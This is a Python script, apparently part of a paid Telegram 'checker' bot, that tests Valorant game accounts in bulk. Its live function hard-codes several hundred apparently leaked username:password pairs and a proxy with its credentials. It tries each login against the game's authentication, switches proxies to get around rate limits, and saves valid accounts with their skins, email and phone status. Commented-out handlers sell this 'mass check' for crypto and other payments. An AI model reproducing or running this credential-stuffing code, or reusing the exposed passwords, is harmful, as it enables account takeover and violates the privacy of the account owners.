
import logging
import random

from filter.is_admin import *
from filter.is_subs import IsSubs_MSG
from keyboards.inline import cb, pay_check, admin_pay_accept, cb_pay, auth_menu
from main import bot,dp
from src.for_more_check import get_proxy, get_skins
from states.state import Check, PayCheck
from valo_lib_more import *
from aiohttp import ClientHttpProxyError, ContentTypeError

#db = DataBase('test.db')


from aiogram import types
from aiogram.dispatcher import FSMContext

#logger = logging.getLogger('app.more_checker')

#@dp.callback_query_handler(cb.filter(action='pay_check'))
#async def pay_for_check(call:types.CallbackQuery):
#    logger.info(f'Команда pay_for_check для пользователя {call.message.chat.first_name}')
#    await call.answer()
#    await call.message.edit_text(text=f"<b>Подписка 'Массовый чек' на месяц</b>\n\n"
#                                f"💰 Стоимость: 250 рублей\n"
#
#                                f"-------------------------------------\n"
#
#                                f"💳 <b>Способы оплаты:</b>\n"
#                                f"<b>LOLZ</b>- <a href='https://zelenka.guru/members/4449624/'>Перевод по профилю</a> - 7% комиссии\n"
#                                f"<b>Crypto USDTtrc20</b> - TSduBdzNLwiy2RZBmfq3ARvBkJi1uGYezC\n"
#                                f"<b>QIWI</b> - https://qiwi.com/n/MEGAMEGA\n\n"
#                                f"📩 Если вам нужен перевод по карте, пишите в личные сообщения.\n",reply_markup=pay_check(),disable_web_page_preview=True)
#
#@dp.callback_query_handler(cb.filter(action='cancel_pay'))
#async def cancel_pay_photo(call:types.CallbackQuery):
#    logger.info(f'Команда cancel_pay_photo для пользователя {call.message.chat.first_name}')
#    await call.answer()
#    welcome_message = (
#        f'👋 Добро пожаловать, {call.message.from_user.first_name}!\n'
#        f'Я бот-чекер игры Valorant. Воспользуйтесь доступными командами для проверки своей коллекции скинов и другой информации. '
#        f'Для начала работы нажмите кнопку "Войти".'
#    )
#    await call.message.edit_text(text=welcome_message,reply_markup=auth_menu('Login'))
#
#
#@dp.callback_query_handler(cb.filter(action='send_pay'))
#async def get_pay_photo(call:types.CallbackQuery,state:FSMContext):
#    logger.info(f'Команда get_pay_photo для пользователя {call.message.chat.first_name}')
#    await call.answer()
#    await call.message.edit_text('Пришлите фото перевода',reply_markup=auth_menu())
#    await PayCheck.get_photo.set()
#
#@dp.message_handler(content_types=types.ContentTypes.PHOTO,state=PayCheck.get_photo)
#async def send_pay_photo(message:types.Message,state:FSMContext):
#    logger.info(f'Команда send_pay_photo для пользователя {message.from_user.first_name}')
#    photo_user = message['photo'][-1]['file_id']
#    await message.answer('<b>Вам придет сообщение о подтверждении оплаты</b>\n')
#    client_id = message.from_user.id
#    await bot.send_photo(chat_id=config.ADMIN_ID,
#                         photo=photo_user,
#                         caption=f'Пользователь {message.from_user.first_name} | {message.from_user.id}\n',reply_markup=admin_pay_accept(client_id=client_id))
#    await state.reset_state()
#
#@dp.callback_query_handler(cb_pay.filter(action='pay_yes'))
#async def accpet_subs_pay_check(call:types.CallbackQuery,callback_data:dict):
#    logger.info(f'Команда accpet_subs_pay для пользователя {call.message.chat.first_name}')
#    await call.answer()
#    client_id = callback_data.get('client_id')
#    await call.message.reply('Отправал сообщение что скоро добавят в бота')
#    await bot.send_message(chat_id=client_id,
#                           text='✅ Платеж успешно завершен!'
#                                'В ближайшее время вам одобрят функцию\n')
#
#@dp.callback_query_handler(cb_pay.filter(action='pay_no'))
#async def cancel_pay_accept(call:types.CallbackQuery,callback_data:dict):
#    logger.info(f'Команда cancel_pay_accept для пользователя {call.message.chat.first_name}')
#    await call.answer()
#    client_id = callback_data.get('client_id')
#    await call.message.answer('Оплата удалена')
#    await bot.send_message(chat_id=client_id,text=f'❌ Оплата не прошла\n'
#                                                    'Если произошла ошибка, свяжитесь по контактам в боте\n')
#
#
#
#@dp.callback_query_handler(cb.filter(action='more_check'))#IsSubs_MSG(),
#async def more_check_menu(call:types.CallbackQuery):
#    logger.info(f'Команда more_check_menu для пользователя {call.message.chat.first_name}')
#    await call.answer()
#    await call.message.edit_text(
#                              '<b>Введите ваши аккаунты в формате</b>\n'
#                              'log:pass\n'
#                              'log:pass\n\n'
#                              '<b>Важно</b>\n'
#                              '-Для наилучшей работы бота, закидывайте не больше 100 штук.\n'
#                              '-При неправильном формате , бот может работать не стабильно.\n'
#                              '-Аккаунты должны быть отправлены одним сообщением.',reply_markup=auth_menu()
#                            )
#    await Check.checks.set()



#@dp.message_handler(state=Check.checks)#IsSubs_MSG(),
async def check_check():
    with open(r'C:\Users\роман\PycharmProjects\valorant_checker_test_v2\other\proxy','r') as file:
        count_proxies = len(file.readlines())
    with open(f'no_valid_1.txt', 'w') as file_novalid,open(f'results_2.txt', 'w') as file:
        accounts = ['faskeli13:Pepperkake123', 'zlodziejbroni2003:m4ak47mp5', '31askella:31askella', 'ressam1092:hsyn2267', 'lincolnrv90:gjkyjkeybt12', 'XxinesxX6:inesines05@', 'agustinrebak:43358013qweqwe', 'pavelrepark:1003046pp', 'Opradr:1245996m', 'fbbartufb:bartu3262', 'muhafiz_chan:Mrt102757', 'furkanerduman15:erduman123', 'legokk:Nothing1356', 'salazarusa:en22ba14', 'Herus97:1028ayec', 'imaate2:bgSE9Ut5d', 'UiBaguette:428967wu29', 'ozdogaNN:Angelina.76', 'Kayap0op:Kaya2519', 'Quantyuiz:ar5348214170', 'veltemr:18251825a', 'jakkie2012:5602tenis', 'Selimc2327:basar2002', 'drgltk:drgul4atak', 'atakhanozlemez:325126565Ata33', 'JinxCode013:Tutokevin123!', 'Timur1Sayar:22Timur2008', 'LedUzay10:Jhinbeyy34.', 'thehayerhd:Carlos0709.', 'HelXPer:Atesadam123', 'FurBloodX1:azerbaycan12AS', 'to3e3:pawel310504', 'adasbnn:ada2005A', 'kekbagoly:laciaeva1234', 'eldioskrie:A-ntonio28', 'hyperdma:412200kf', 'emirerhansahin:Erhan3327', 'kekbagoly:laciaeva1234', '1BotLivesMatter1:09102005Erkan', 'mnbv12as:csdxza111', 'wazzahek:zamazimo0', 'littlebuisson:Jbmanin69', 'mira1ya:z8{-4H"4', 'xSyko013:dAN1EL2007_', 'Achartge:172100adrr', 'hadibeyaw:1e2e3w', '0nursux:Mo852147', 'yigitclts58:Suatyigit58', 'xRejinTR:ozdere12', 'tersocry:yusufkaya22', 'Jole077:Husom1983', 'venusntz:ft532500', 'NamiqAbd:messim10', 'mouaiad07:mouaiad74001', 'candinar99:00engindinar13', 'Sokemonx:Kaan2001', 'abdubeedu3:marshalmanoO1', 'EneSker:enes12345', 'Sparkykoc:polat312007531', 'oloplor:481818yef', 'arhandogan55:Ad796344', 'Winkvess:9735420r', 'attackLBRN:elitural123', 'furkkibro123:furkki123', 'SprjmA:10189821358kagan154', 'oyunkafa4:mustafaa35', 'turan585834:sibkurt5858', 'mitoflex0:mitocan123AZ', 'spooki12345:belal1561999', 'Feyzullah31anan:omercan1', 'Muson144:bugra123123.', 'osuten420:Peeter090', 'Kannutir00:saccint180S', 'mehmetuysaljf:Cc3448faster4834.cC', 'PAsHa58TR:ahmet123', 'imepera:caner.2004', 'ghosttocai:lovebaby12', 'legendaryfighter97:dK97101900', 'kgnbsm:Selka9807tr', 'sekesonik1:sekesonik1', 'terra222222:Iosofio2222', 'Milian2608:Agnszy2106', 'speevent:Opklopkl9090', 'ads0248:dd7ae097', 'Sorbytol61:44149172eE', 'Sorbytol61:44149172eE', 'terra222222:Iosofio2222', 'ceyhuntulum:34cph483S', 'eneskumrular4535:manisaizmir4535', 'halitgoztepe00:t123y123', 'hijackmontana:5sxx28ww', 'Markus264:JohMarFunTv123', 'Knuspertoast846:Fabian2707', 'wadeadraxx:wadea1999', 'getirenfk:Nisan.2121', 'AhmetDate:123Ahmet+', 'supmove1:sene1990', 'TRByqush:0085ee206efe', 'Kaito97166:66720KaitoTetsuki', 'borisocisse:Romustrike-03290', 'whittenduck:Gagamika609', 'xWplaiis:29bfgcixd', 'HsNTaken:hcb05380538454', 'jeun1s:Melisensar1', 'jey13gamer:Zo132019145Ju0305', 'falimtr:sifremiunuttum123', 'pawkett31:!Baban31', 'tenokami2033:TenOkami2033', 'xshadowlol999:Joshhopper009', 'ehmasivastrolimlidixd:Dra47teCEK', 'pleni19:e9a75v1200', 'realweey:123tark456', 'dedkyndet:csad2401', 'nalarixxx:alituna2005', 'osuten420:Peeter090', 'Kayap0op:Kaya2519', 'DarckAyen:isaie2006', 'Tosura1413:bobik222', 'itsatkin:Picklelicker92', '0Techno0:Jac0bTW3@1@1', 'anxinokedlivelkacsa:e007465_VF', 'baekeunsuk:joy6293@!', 'xxitqt2:0556056260s', 'OhArael:Nethereum1933!N', '0hArael:Nethereum1933!N', 'Flexzynova:Nethereum1933!N', 'W0lvezzYT:Qdwehep7', 'pleni19:e9a75v1200', 'halitgoztepe00:t123y123', 'thingboota:kar98km416', 'kilobamya1:mrmohabdoawad11', 'eliminate25:Soinc200329', 'etabus:Agitatul1', 'jagharchan:Mhamedloveyou1.', 'markowski70:memo152001', 'kaleciklimustafae:6601018949461e', 'kaleciklimustafae:6601018949461e', 'salihoren383:258258salih', 'jankidzi:Kikirmikir123@!', 'DarckAyen:isaie2006', 'Xexs1337:erhansargin069', 'chooza1:sadplayerofc1', 'QQOneTap:05078850056a', 'carlosmp98:CARmil98_', 'TytRanger20062:saadhaksingh2006', 'klapedbynoa123:Laqucu65', 'JeremyFZ:Jeremy19022004*', 'LunaticFridge19:1029384756qwqwQQ', 'elprenawelas:prenawelas1', 'XCVSupportive:danielonly7890', 'Pelikan3588:fasyuifi124', 'luqmanhafiz:fsadghfh3212s', 'luqmanhafiz111:fdasgsfhj241', 'cristianrn07:fauyuosfj214', 'adamelgannoufi1:tekengod1', 'suceleste:Assasin2005#', 'kik0013:Fgr89r6773480GFFF', 'ceyhanaskin:vwfAwvn7F96tFVJaE38N', 'boodiboys:Aboodharun_21', 'keyfeature:!KeFr07Pass?', 'LimonGAZABI:ismail2007isot', 'soyunapatata1234567890:patata12', 'MongoReis:Duck12121%', 'BiGM3100:07998205641A', 'kaizoku7123:mariemfares2006', 'timasxd:Qerpus96+', 'krobabaysf:yusufzewo12', 'win5ter:Faneca05!', 'jankidzi:Kikirmikir123@!', 'DarckAyen:isaie2006', 'QQOneTap:05078850056a', 'carlosmp98:CARmil98_', 'TytRanger20062:saadhaksingh2006', 'klapedbynoa123:Laqucu65', 'timasxd:Qerpus96+', 'krobabaysf:yusufzewo12', 'win5ter:Faneca05!', 'Rewwwrr:puwildo3131kK!?', 'sgare2:saifahmed123', 'Nahox1k:damir1203', 'mezo1834:Ahmetesma1903', 'idrisss1122:idriss_0770114807', '2416118K2:DupaJasia321123!', 'moumineb09:moumineb08', 'tmrlalaylaylom:Babalarr5767', 'zexovx:415263ett', 'itzblackozean:Seppsie123', 'Boodiboyyy:Aboodharun2', 'timasxd:Qerpus96+', 'adamelgannoufi:soloperorico1', 'whittenduck:Gagamika609', 'armstormdevil1:@Zack9999', 'xxitqt2:0556056260s', 'akusocut3:hakoege1907', 'merhabacanimbenamcanim:uner20112011', 'merhabacanimbenamcanim:uner20112011', 'winsonlcyna1221:Ac_1N9Ys', 'umehahalaugh:zcS-b7U0', 'jaspion525:4_BhYoJE', 'milfhunterBR:-KaD5kmY', 'jhonelcazador:jhonydas12', 'Kayap0op:Kaya2519', 'Kayap0op:Kaya2519', 'borisocisse:Romustrike-03290', 'Milian2608:Agnszy2106', 'Sorbytol61:44149172eE', 'jhonelcazador:jhonydas12', 'dogijan:dedeler1', 'mertkolpa2:Qv8NzX7HG', 'Alprolol:1c2c3a4a5c6a7A', 'renxoffciel:alexbb9876', 'radonsiderRn86:RadonsiderRn86', 'AILLH:Zz0011mm', 'keffoh:eolo909090', 'RutgerVsYou:rvs12345', 'FASLITOR:Nolik2589', 'Pas40k:Protup670', 'Solomon238:trane238', 'Skreage:Gorotoker123', 'F4booo:vabian01', 'cMypqpNk:asia2002', 'FiorkKMS:KFS315147', 'eliteking2194:w-j3GFDi', 'eliteking2194:w-j3GFDi', 'wislanter002:lV_F9Rhk', 'MrGotsirub:lV_F9Rhk', 'FraggerAries:Eshkere22', 'MrAxcyF4:Pokimon228', '055268761300:05523282208wme', 'AbdurrahmanEldeep2:Moaaz2004', 'SosisliKW:35kc4414', 'adamelgannoufi:soloperorico1', 'adamelgannoufi:soloperorico1', 'LPharrao:BZia1998!', 'xGrakosek:!Wizard2007', 'dac3x:dacex123', 'drmrok:Aaa29022008#', 'Emirhancuk1:malcatman123123123!', 'Rickroll6969:3.141592HandbollP07', 'Gyalbuw:passsword998..', 'wolfox9651:ROM_4_IK', 'K7sd9:24680Abc', 'GGBGCrax:Valentin1+-', 'kingslayer71:HellBlaZe10031995', 'elprenawelas:prenawelas1', '055268761300:05523282208wme', 'suceleste:Assasin2005#', 'JeremyFZ:Jeremy19022004*', 'jankidzi:Kikirmikir123@!', 'klapedbynoa123:Laqucu65', 'carlosmp98:CARmil98_', 'QQOneTap:05078850056a', 'suceleste:Assasin2005#', 'miti0o:M152009T', 'kik0013:Fgr89r6773480GFFF', 'ceyhanaskin:vwfAwvn7F96tFVJaE38N', 'boodiboys:Aboodharun_21', 'carlosmp98:CARmil98_', 'keyfeature:!KeFr07Pass?', 'soyunapatata1234567890:patata12', 'MongoReis:Duck12121%', 'carlosmp98:CARmil98_', 'ShowMeSenpaiii:felixvalaccount69&', 'jopotravieso59:eneko2010', 'Baughbag:Johnjohn1!', 'im1smirf:Hbnmj@21', 'tomlebanquier:Tomseurat2011', 'newtonix08:mozArelAd1eb3108', 'DENIZKID1:44dhdehgedhg', 'IDontBelieveIt4:Jokubasgud24', 'AxionMw2:JESKO889', 'CinnamonStrawberryBagel:eshkere22', 'Dieranker:eshkere22', 'notameliacoyne:Zhann!23', 'MrHyper18:hy77my87', 'sadlezz8:Tessa69536953*', 'tainterdragon:de3-uEa9', 'sfeerubio:q-qjUH0A', 'eerubio:de3-uEa9', 'bbldel:1986osmn', 'rebeldefan06oz7zv:AqOwzT4sY1XWhdzF', 'sadlezz8:Tessa69536953*', 'aguijon7:migue777smonster', 'arkanis2020:Niceboy1985', 'loli2lo:loli232324', 'apaciselim31:Canmustafa25', 'lambo3311:JigoKomo2', 'tirehard:Luk@sz2005', 'monkejett:Idkdude1738', 'kimyasin67:Yasin123', 'INCURIAA:burak123456Bs', 'BLUDGEON909:zohaib3194', 'itay1210:pook11009', 'Franjesus26:fj26loko26', 'wolkan01234:WOLKAN01234', 'Sachi5894:Komputerek2', 'omarbr050:omarbassam12', 'larrikineune1:JESKO889', '0komma125:JESKO8891', 'BlueRapata:JESKO889', 'alphaso1:JESKO123', 'mrscraxx:JESKO8891', 'ginxtonic:JESKO8891', 'Samukasl51s:JESKO8891', 'Samukasl51s:JESKO8891', 'IDontBelieveIt4:Jokubasgud24', 'wolfox9651:ROM_4_IK', 'K7sd9:24680Abc', 'GGBGCrax:Valentin1+-', 'kingslayer71:HellBlaZe10031995', 'elprenawelas:prenawelas1', '055268761300:05523282208wme', 'Boodiboyyy:Aboodharun2', '055268761300:05523282208wme', 'timasxd:Qerpus96+', 'krobabaysf:yusufzewo12', 'win5ter:Faneca05!', 'Rewwwrr:puwildo3131kK!?', 'sgare2:saifahmed123', 'Nahox1k:damir1203', 'mezo1834:Ahmetesma1903', 'idrisss1122:idriss_0770114807', '2416118K2:DupaJasia321123!', 'moumineb09:moumineb08', 'zexovx:415263ett', 'itzblackozean:Seppsie123', 'Boodiboyyy:Aboodharun2', 'nhantruong6114:fadsyulhio14', 'jyep:Pepel337', 'JyeP8:Pepel337', '01276024649:moscow01276024649700', '9yu10:yutoA0819', 'Nekomaneki123:Fu1Ku3Ma1Ne3Ki', 'miyasita3:Miyasitayuuto1125', 'miyasita3:Miyasitayuuto1125', 'Ouhjay:p@ulinhosousa', 'sonnepkld7:bobik222', 'Pap1Chuloooooo:7jZpKd_d', 'getclapped2100:getclapped2100', 'thanatat13598:fdasguyfll241sa', 'thanatat1:fdasfya421sa', 'OffFlow:_54b8dMY', 'Gartagenyve:bobik222', 'Aheckert1988:-vQ_38ot', 'komutanlogar0101:8XvQ-MaU', 'komutanlogar0151:8b_TQCFB', 'fe1xtw:bobik222', 'thanatat13598:fdasguyfll241sa', 'hamu1129:Leohawaii2853', 'kanadeteyan:kanadetyan2589', 'rcvinez:safwanbeast123', 'mhmdassaf15:Mohamad.assaf22V', 'kenyigitreal:propro235', 'muzlumeyve:gs1905elci', 'rcvinez:safwanbeast123', 'michaelsurfing198:bobik222', 'sorendarcos:48822744t', 'DiamondSkopp14:jadenawesome2.', 'Vatiflop:anaisdu19800.', 'VtyGamingDevYT:Devin!Aleksic2403SHashiracaGaming24032001ilicazn3tlQoZ?Keyko!Ayano', 'WayQSwxvy:GFBIBynJ11TfQg', 'Deivgm:seva228@', 'pixelkian:Pippin123!', 'roidu06:Teb33333-', 'kogypower:ahmed123kogy', '6sayz:guykin31452', 'layaska:Hekou38100', 'angelll423:trinity0406', 'vejtim:apo315646', 'ahmedhosni159:1052007ahmed', 'boquartzz:sabenekin2001dedo', 'hidrogenv33:Vlad#2024', 'starmaxito:asdAS2$asf2GSD', 'Weshizha:asdAS2$asf2GSD', 'hidrov33:asdAS2$asf2GSD', 'Sbeadellesda:asdAS2$asf2GSD', 'toadinnit:Br00kvale', 'muratkral2332:muratkral23', 'bas1que:Avion123$', 'im1smirf:Hbnmj@21', 'pekinas2115:KRJckgxdsaoug54', 'QTorrentLTU:mamadzo123456', 'QTorrentLTU:mamadzo123456', 'masterrr00:illsliturthroat1', 'masterrr00:illsliturthroat1', 'yMikail64:yMikail64', 'BiganehValorant:Big@neH13400', 'potertokox:potertokox123', 'onlycactus12:onlycactus12', 'blackbanan1:blackbanan1', '123silentkiller321:szczep304', 'mraovic111:acer12mn', 'venomQT1:kriskodrisko123', '1AdeWasTaken1:AdePade2006', '3abboud2000:123456Charbel', '3abboud2000:123456Charbel', 'nolefam123:gifioforgifi2001', 'atletligta:qQqsc963741.', 'Negashis:Lestienne07@', 'kaanemre0816:Ekaan0816', 'thealgul:Ertan2019@@', 'Moazwalidmohamed10:Blackpanther2214', 'wn11040000:wn11040000', 'angelll423:trinity0406', 'aguijon7:migue777smonster', 'TeRnIFaZe:Leon0508', 'wowobraz:aytoselo45', 'rcvinez:safwanbeast123', 'angelll423:trinity0406', 'FeldarztTimo:77b127de4f7g.', 'Huntsman872:avci35274877', 'omaromran01111:omaromran01102144304', 'szunyiknife:Kecsketej98$$', 'Lambo3311:JigoKomo2', 'Deivgm:King228@', 'sdy4709:**rara3443', 'Deivgm:King228@', 'wowobraz:aytoselo45', 'potertokox:potertokox123', 'moinedein:Goodpass12', 'sweetzabka:N1E2o3i615', 'vetoxVB:tomjunior2010', '055268761300:05523282208wme', 'akanzyahmet:Demirahmet0611', 'vetoxVB:tomjunior2010', 'potertokox:potertokox123', 'AxionMw2:JESKO889', 'AxionMw2:JESKO889', 'neI2u:yamasita4423', 'YomirU1999:Komatukazuki0612', 'ramosakamiya:masa030421', 'RaZeLesMurs:Pepette76', 'AxionMw2:JESKO889', 'sadlezz8:Tessa69536953*', 'aguijon7:migue777smonster', 'apaciselim31:Canmustafa25', 'lambo3311:JigoKomo2', 'tirehard:Luk@sz2005', 'monkejett:Idkdude1738', 'kimyasin67:Yasin123', 'INCURIAA:burak123456Bs', 'BLUDGEON909:zohaib3194', 'itay1210:pook11009', 'Franjesus26:fj26loko26', 'wolkan01234:WOLKAN01234', 'Sachi5894:Komputerek2', 'wolkan01234:WOLKAN01234', 'potertokox:potertokox123', 'Vitixem:zzCLLgKfunLI9L', 'kurczusx:P07bIqUTpnZhEn', 'sadlezz8:Tessa69536953*', 'ratpakpat:P07bIqUTpnZhEn', 'kubinek001:P07bIqUTpnZhEn', 'potertokox:potertokox123', 'Pyrzan06XD:P07bIqUTpnZhEn', 'Lordzik1231:P07bIqUTpnZhEn', 'kimsangdo2757:skeh5474#', 'iamgodch2:Fantoma12', 'njbard123:Ri5sTZIxOR76M1', 'njbard1234:Ri5sTZIxOR76M1', 'KingSneakyTurtle:Ri5sTZIxOR76M1', 'OriustheBear:Ri5sTZIxOR76M1', 'Eq1NoXxx31:furkan20052005', 'Ludzkini:Abbey3years!', 'sl4yr2:Niki-2904', 'nediachichaa:Erkbfa6er12', 'Rafester18:Egan2001Rafe', 'badrnh2001:Sirtal3ab.', 'HelloIAmKratoz:tioR@2006!', 'Ludzkini:Abbey3years!', 'mustafababapromax:mustafa12215566', 'cruiz12:oWc-9yju', 'Ludzkini:Abbey3years!', 'r1ckysik:JI#4DJ1293JW', 'zPMJH:Danielislegit19!', 'badrnh2001:Sirtal3ab.', 'byncg:G280204n', 'AQDV:25874123690E', 'zPMJH:Danielislegit19!', 'thulumrai:m3salCAR', 'HelloIAmKratoz:tioR@2006!', 'nightmare9o9:medo9090', 'snicearn:GooGle192', 'Yatuflex:Nougat123_', 'terra222222:Iosofio2222', 'elNubes:gollomollo1', 'LuxxIstBack2:GleggmireSlice133', 'gotdestroyd:20e3255f7', 'alicem115:/@...1234ali', 'bloon2012:ШЈШґЩ‡ЩЉШґЩ‚ШґЩ…Щ‡_27@', 'QTorrentLTU:mamadzo123456', 'madara34829:ZzZz1212123', 'hijackmontana:5sxx28ww', 'sl4yr2:Niki-2904', 'aJaxStore:Dayanabolicherendan131192', 'iamgodch2:Fantoma12', 'Locasuma:megafreunde123', 'MatisDup1:3157065298Y', 'ganyux2:Adenn2008', 'IRonald5648I:fadstfyasho421', 'L3v4d1m:fdasfykals12', 'ZaunitVagabond:fgakylsido2441', 'L3vl4dOnBush:fdasfyulas412', 'olzeus12:fdafkadsui421sa', 'Lokilol14:dfasfyiuo14', 'cicerofljr2:fdasfuyalsi421', 'Ro5648:fdafilashol214wsa', 'badrnh2001:Sirtal3ab.', 'MatisDup1:3157065298Y', 'DanielCortes327:copito123', 'madara34829:ZzZz1212123', 'Lightoneishit:Daddychill69', 'dreeym:davidmora2810', 'celiombor:celiombor123', 'NigelThornberry3:NigelThornberry3', 'Bramz0777:Manfaat12', 'Bramz0777:Manfaat12', 'venque123:A5F22022', 'Graylabell:Orcunyasin1453', 'hijackmontana:5sxx28ww', 'mertmenlik:mm12335336488', 'xwnC:greta19020890011', 'rsadu:rosadu1980', 'EmoTreterJonas187:Jonaskiki12309', 'CevapTheSLO:kolesarjenje15', 'ExPErTs505:kerem505', 'ahmed6o:ahmed6102008', 'mantosee:0550183275a', 'JanusLePro:JhoniLeBoss09', 'yape86:gmail030303', 'TCHIGIRI:sirhtatji2018', 'WilliamMcC08:WilliamMcCandless09', 'Macario79:berraco77', 'aculie:st285730', 'apaciselim31:Canmustafa25', 'Cronnor5:Cronnor50520', 'sadlezz8:Tessa69536953*', 'mishael0527:hmcl0527', 'karcsiKJ:RockWool2022', 'DepressionBadMood:YYZT123..+', 'VQuaad:342yB4poat58789/*9', 'wowobraz:aytoselo45', 'EmoTreterJonas187:Jonaskiki12309', 'Lolerokunn:Ma1079174926', 'ElCounterXD2:3217763377A', 'chiripiorca69:mimachita12', 'dboys0131:Ns339709', 'wmendez27:Spider.monkey1', 'YossyRice:www.4989', 'betodavid10:david_beto@costel', 'CondeRojo2:46993026As', 'A7MXD12:AhmedAlHaMMAdi_13p6789.34', 'elNubes:gollomollo1', 'madara34829:ZzZz1212123', 'byncg:G280204n', 'supprrraaa:123321cebis', 'supprrraaa:123321cebis', 'xxobless:E$pagueti4', 'alicem115:/@...1234ali', 'Pano1090707:chakra77', 'angelll423:trinity0406', 'AQDV:25874123690E', 'Fyroxxxxxxxxxx:larochelle43700D+', 'MrMangel:GOKUVSCELL2015', 'karcsiKJ:RockWool2022', 'KurgusuZV2:Adanaspor0077', 'themarinna:1312azerty', 'toxlcabi:Tuptus2011Qaz', 'angelll423:trinity0406', 'OrdekMuz:saime2004', 'terra222222:Iosofio2222', 'vannu7:Gughi2010', 'Pano1090707:chakra77', 'QQlowW:Bora.can1', 'zPMJH:Danielislegit19!', 'BerndAmLegends:Poldi123', 'MarryJane43:MarryJane43', 'hotful:hotful123', 'juicylemooooooon:juicylemooooooon123', 'xyphonhd:xyphonhd123', 'EveryTimeIgoREIN:EveryTimeIgoREIN123', 'EveryTimeIgoREIN:EveryTimeIgoREIN123', 'EveryTimeIgoREIN:EveryTimeIgoREIN123', 'spectricbingi:asdAS2$asf2GSD', 'xm47x:merofast2100902', 'AQDV:25874123690E', 'fabioxu2:F@bio112233', 'tomaboss1339:Werty12345$', 'plizzix:Hugo120908', 'emoji32p:Ertab12908.', 'CelalTazecan:celalgs1905', 'bionicVex:46Aedlgrhy/', 'Dragonsinmeliodas135:Hussain2003', 'dakatsuevil:FKU4R3RQ', 'raullopezzz:Meteorito2004', 'CREWELOO00:gmailfacebook12', 'toadinnit:Br00kvale', 'bas1que:Avion123$', 'purdinator95:Jodie250217', 'toadinnit:Br00kvale', 'toadinnit:Br00kvale', 'Locasuma:megafreunde123', 'aJaxStore:Dayanabolicherendan131192', 'samicxx:Semih2001.', 'Speedblazer2:Rose1969!', 'kizildemirakar:Demirselim1', 'adammody2021:mody1301', 'kizildemirakar:Demirselim1', 'jemsmacznygruz2115:fdasjfuias21', 'seCretToFF:fadfjakj21wa', 'seCretToFF:fadfjakj21wa', '7zAragon:fdasfliauo214wsa', 'LordDeath1102:fasdgfhkaj241as', 'plutaso90:fiadsjf23sa', 'GreeddyKing:fdasfular21sa', 'frankito1026:fadsflhasj21s', 'Hungthyb5:fadsgas21sa', 'tunapoyraz5506:tunapoyraz2005', 'tunapoyraz5506:tunapoyraz2005', 'MuziMuzzi:efdasijfo214', 'iSamu7w7:fdasflahjlk241wsa', 'santyroldans:gthe54restgfedfrg', 'dacha2207:fgw5gw45gw46ghw', 'moreninja22:drgtu7i8o96t786uty', 'duxaz07:e5r6hye56he67jetyu', 'jaydens2020:thyr46eyhw5etg'][::-1]


        acc_good = {}
        regions = ['latam', 'br', 'na']
        proxy = '94.131.80.133:9841:v04HnY:9z032o' #'http://pwERmR:iVTCIzRG4i@31.12.93.201:3000'#pwERmR:iVTCIzRG4i@31.12.93.201:3000
        auth_base = Auth()

        account_step = 0
        account_check = 0
        proxy_stop = 0

        while account_step < len(accounts):
            time.sleep(10)
            login = accounts[account_step].split(':')[0]
            password = accounts[account_step].split(':')[1]
            try:
                authenticate = await auth_base.authenticate(username=login, password=password, proxy=proxy)#aiohttp.client_exceptions.ClientHttpProxyError
                print(authenticate)
                print(login)
            except (ClientHttpProxyError,ContentTypeError) as e:
                    print('Смена прокси')
                    proxy_get = get_proxy()[random.randrange(count_proxies)]
                    proxy = f'http://{proxy_get["username"]}:{proxy_get["password_ip"]}:{proxy_get["port"]}'
                    # authenticate = await auth_base.authenticate(username=login, password=password, proxy=proxy)
                    continue
            # Если не правильный лог пасс
            if 'error' in authenticate and authenticate['error'] == 'auth_failure':
                file_novalid.writelines(f'{login} - not valid\n')
                print(f'Не валид {login}')
                account_step += 1

                account_check += 1
            # Если лимит по запросам с одного IP
            elif 'error' in authenticate and authenticate['error'] == 'rate_limited':
                proxy_get = get_proxy()[proxy_stop]
                proxy = f'http://{proxy_get["username"]}:{proxy_get["password_ip"]}:{proxy_get["port"]}'
                # authenticate = await auth_base.authenticate(username=login, password=password, proxy=proxy)
                proxy_stop += 1
            # Если все ок и прошла аунтефикация
            else:

                acc_good[login] = password
                access_token = authenticate['data']['access_token']
                token_id = authenticate['data']['token_id']
                puuid, name, tag ,email_verif,phone_verif= await auth_base.get_userinfo(access_token)
                entitlements_token = await auth_base.get_entitlements_token(access_token)
                region = await auth_base.get_region(access_token, token_id)
                region_output = region
                if region is None:
                    file_novalid.writelines(f'{login} - not valid\n')
                    account_step+=1
                    account_check+=1
                    continue
                if region in regions:
                    region = 'na'
                items = auth_base.get_items(item='e7c63390-eda7-46e0-bb7a-a6abdacd2433',
                                            ent_token=entitlements_token,
                                            region=region,
                                            acc_token=access_token,
                                            puuid=puuid)

                result = get_skins(items=items, login=login, password=password,email=email_verif,region=region_output,
                                   phone=phone_verif)
                print(f'Валид {login}')
                file.writelines(f'{result}\n')
                account_step += 1
                account_check += 1
    file.close()
    file_novalid.close()
    try:
        print('Тут что то ')
    except Exception as e:
        print('Валидных акков нет ')
    try:
        print('Не валид тут отправляется ')
    except Exception as e:
        print('Не валида нет')

if __name__ == '__main__':
    asyncio.run(check_check())


